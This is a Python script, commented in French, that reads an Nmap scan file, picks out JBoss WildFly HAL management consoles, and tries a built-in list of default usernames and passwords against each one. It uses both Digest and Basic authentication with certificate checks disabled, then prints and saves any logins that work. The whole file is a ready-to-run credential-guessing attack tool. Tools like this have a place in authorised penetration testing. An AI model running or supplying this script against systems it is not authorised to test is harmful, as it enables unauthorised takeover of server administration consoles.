#!/usr/bin/env python3
"""
Script qui parse un fichier .nmap, identifie les services JBoss WildFly
(HAL Management Console) et teste les credentials par défaut.
"""

import re
import sys
import argparse
import requests
from requests.auth import HTTPDigestAuth, HTTPBasicAuth
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Credentials par défaut connus pour JBoss/WildFly
DEFAULT_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "admin123"),
    ("admin", "password"),
    ("admin", "Admin#70365"),
    ("admin", ""),
    ("jboss", "jboss"),
    ("jboss", "admin"),
    ("root", "root"),
    ("root", "admin"),
    ("wildfly", "wildfly"),
    ("administrator", "administrator"),
    ("admin", "wildfly"),
    ("manager", "manager"),
    ("admin", "jboss"),
    ("admin", "jbossas"),
    ("admin", "jbossadmin"),
    ("admin", "redhat"),
]

# Chemins typiques de la console management
MGMT_PATHS = [
    "/management",
    "/console",
    "/console/index.html",
]


def parse_nmap_file(filename):
    """
    Parse un fichier .nmap et retourne une liste de tuples (host, port, scheme)
    pour les services JBoss WildFly identifiés.
    """
    targets = []
    current_host = None

    with open(filename, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()

    # Découpage par hôte
    host_blocks = re.split(r"Nmap scan report for ", content)

    for block in host_blocks[1:]:
        # Récupère le hostname/IP
        first_line = block.splitlines()[0]
        m = re.match(r"(?:([\w.\-]+)\s+\(([\d.]+)\)|([\d.]+|[\w.\-]+))", first_line)
        if m:
            host = m.group(2) if m.group(2) else (m.group(3) or m.group(1))
        else:
            host = first_line.strip()

        # Parcourt les lignes pour trouver les ports ouverts et les services
        lines = block.splitlines()
        current_port = None
        current_scheme = "http"
        is_jboss = False
        port_buffer = {}

        for i, line in enumerate(lines):
            # Détection ligne de port
            port_match = re.match(r"^(\d+)/tcp\s+open\s+(\S+)", line)
            if port_match:
                # Si on était sur un port précédent et qu'on a détecté JBoss
                if current_port and is_jboss:
                    targets.append((host, current_port, current_scheme))

                current_port = int(port_match.group(1))
                service = port_match.group(2)
                current_scheme = "https" if "ssl" in service or "https" in service else "http"
                is_jboss = False

            # Détection des marqueurs JBoss/WildFly
            if current_port:
                if "JBoss WildFly" in line or "HAL Management Console" in line:
                    is_jboss = True
                if "ssl" in line.lower() and "http" in line.lower():
                    current_scheme = "https"

        # Dernier port du bloc
        if current_port and is_jboss:
            targets.append((host, current_port, current_scheme))

    return targets


def test_credentials(host, port, scheme):
    """
    Teste les credentials par défaut sur l'URL de management de JBoss/WildFly.
    """
    print(f"\n[*] Test de {scheme}://{host}:{port}")
    found = []

    # Détermine le bon endpoint
    base_url = f"{scheme}://{host}:{port}"
    test_path = None

    # Essaye de trouver l'endpoint management actif
    for path in MGMT_PATHS:
        try:
            r = requests.get(base_url + path, verify=False, timeout=5, allow_redirects=False)
            if r.status_code in (401, 200, 302):
                test_path = path
                if r.status_code == 401:
                    auth_header = r.headers.get("WWW-Authenticate", "")
                    print(f"    [+] Endpoint trouvé: {path} (auth: {auth_header.split()[0] if auth_header else 'unknown'})")
                    break
        except requests.RequestException:
            continue

    if not test_path:
        print(f"    [-] Aucun endpoint management accessible trouvé")
        return found

    target_url = base_url + test_path

    for user, pwd in DEFAULT_CREDENTIALS:
        for auth_class in [HTTPDigestAuth, HTTPBasicAuth]:
            try:
                r = requests.get(
                    target_url,
                    auth=auth_class(user, pwd),
                    verify=False,
                    timeout=5,
                    allow_redirects=False,
                )
                if r.status_code in (200, 302, 303):
                    auth_type = "Digest" if auth_class == HTTPDigestAuth else "Basic"
                    print(f"    [!!!] SUCCÈS: {user}:{pwd} ({auth_type}) - HTTP {r.status_code}")
                    found.append((user, pwd, auth_type))
                    break  # Pas besoin de tester l'autre auth
            except requests.RequestException as e:
                pass

    if not found:
        print(f"    [-] Aucun credential par défaut valide")

    return found


def main():
    parser = argparse.ArgumentParser(
        description="Teste les credentials par défaut sur les services JBoss WildFly identifiés par Nmap"
    )
    parser.add_argument("nmap_file", help="Fichier .nmap à analyser")
    parser.add_argument("-o", "--output", help="Fichier de sortie pour les credentials trouvés")
    args = parser.parse_args()

    print(f"[*] Parsing de {args.nmap_file}...")
    targets = parse_nmap_file(args.nmap_file)

    if not targets:
        print("[-] Aucun service JBoss WildFly trouvé dans le fichier nmap")
        sys.exit(0)

    print(f"[+] {len(targets)} service(s) JBoss WildFly identifié(s):")
    for host, port, scheme in targets:
        print(f"    - {scheme}://{host}:{port}")

    results = []
    for host, port, scheme in targets:
        found = test_credentials(host, port, scheme)
        for user, pwd, auth_type in found:
            results.append(f"{scheme}://{host}:{port} - {user}:{pwd} ({auth_type})")

    print("\n" + "=" * 60)
    print("RÉSUMÉ")
    print("=" * 60)
    if results:
        print(f"[+] {len(results)} credential(s) par défaut trouvé(s):")
        for r in results:
            print(f"    {r}")
        if args.output:
            with open(args.output, "w") as f:
                f.write("\n".join(results) + "\n")
            print(f"\n[+] Résultats sauvegardés dans {args.output}")
    else:
        print("[-] Aucun credential par défaut n'a fonctionné")


if __name__ == "__main__":
    main()
